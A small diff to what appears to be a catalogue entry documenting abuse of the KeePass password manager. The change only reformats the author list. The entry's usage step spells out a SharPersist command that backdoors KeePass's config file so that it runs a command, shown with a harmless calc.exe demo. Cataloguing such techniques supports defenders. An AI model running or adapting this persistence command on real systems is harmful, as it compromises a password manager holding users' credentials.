@@ -1,6 +1,8 @@
 Name: KeePass
 Description: KeePass is a free open source password manager.
-Author: 'Adam Brass', 'Martin Sohn Christensen'
+Author: 
+  - 'Adam Brass'
+  - 'Martin Sohn Christensen'
 Created: 2023-02-28
 Usage:
   - Steps: KeePass config file is backdoored by SharPersist by using 'SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add' where -t argument (persistence technique) keepass, -c argument (command to execute), -a argument to mask the previous command, along with the -f argument to create/ or modify the corresponding KeePass config file, ending with -m argument as method for (add, remove, check, list) add.
